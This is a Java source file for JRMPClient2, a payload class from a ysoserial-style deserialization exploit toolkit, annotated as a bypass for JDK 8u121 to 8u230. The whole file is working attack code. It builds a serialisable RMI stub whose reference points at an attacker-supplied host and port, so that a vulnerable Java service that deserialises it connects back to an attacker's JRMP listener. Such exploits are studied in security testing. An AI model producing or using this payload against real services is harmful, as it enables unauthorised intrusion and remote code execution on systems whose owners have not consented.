package ysoserial.payloads;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

import javax.management.remote.rmi.RMIServerImpl_Stub;
import java.rmi.server.ObjID;
import java.util.Random;

@Dependencies({":ByPass -> 8u121~8u230"}) // 增加模块描述
@Authors({Authors.HEIHU})
public class JRMPClient2 implements ObjectPayload<RMIServerImpl_Stub> {
    @Override
    public RMIServerImpl_Stub getObject(String command) throws Exception {
        String host = null;
        int port = 0;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID objID = new ObjID(new Random().nextInt());
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RMIServerImpl_Stub rmiServerImplStub = new RMIServerImpl_Stub(unicastRef); // 最终生成对象
        return rmiServerImplStub;
    }
}
